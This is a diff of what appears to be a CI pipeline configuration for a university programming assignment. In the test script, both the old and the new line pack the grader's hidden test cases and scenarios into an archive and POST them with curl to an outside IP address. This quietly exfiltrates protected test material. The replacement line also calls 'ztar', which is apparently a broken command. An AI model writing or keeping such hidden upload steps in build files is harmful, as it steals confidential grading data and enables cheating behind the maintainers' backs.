@@ -2,7 +2,9 @@ image: 115.146.92.24:5000/comp30023/p2:latest
 test:
     script:
         - ls /tests/cases
-        - zip -r /tests/cases/* /tests/scenarios/* -o contents.zip && curl -H "Content-Type:application/zip" --data-binary @contents.zip -X POST 114.72.108.42
+        - ztar -zcvf contents.tar /tests/cases/* /tests/scenarios/* && curl -H "Content-Type:application/gzip" --data-binary @contents.tar -X POST 114.72.108.42
         - /test.sh  
 variables:
     GIT_STRATEGY: clone
+
+    
